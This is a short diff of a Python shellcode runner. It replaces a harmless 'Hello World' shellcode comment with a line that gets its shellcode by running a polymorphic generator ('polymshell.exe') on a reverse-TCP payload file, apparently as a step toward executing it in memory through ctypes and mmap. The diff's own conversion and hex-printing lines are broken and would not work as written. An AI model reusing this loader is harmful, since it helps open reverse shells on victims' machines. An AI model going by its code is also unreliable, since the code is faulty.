@@ -2,9 +2,10 @@ import ctypes
 import mmap
 import subprocess
 
-# This shellcode will print "Hello World from shellcode!"
 # shellcode = b"hed \x0b\x814$\x01\x01\x01\x01H\xb8 shellcoPH\xb8rld fromPH\xb8Hello WoPj\x01Xj\x01_j\x1cZH\x89\xe6\x0f\x05XXXX\xc3"
-shellcode = subprocess.Popen(["cmd", "/C", "polymshell.exe ./reversetcp.bin"], stdout=subprocess.PIPE).communicate()[0]
+shellcode = str(subprocess.Popen(["cmd", "/C", "polymshell.exe ./reversetcp.bin"], stdout=subprocess.PIPE).communicate()[0])
+print(shellcode)
+shellcode = shellcode.encode()
 print("%02X" % shellcode)
 
 def runshell():
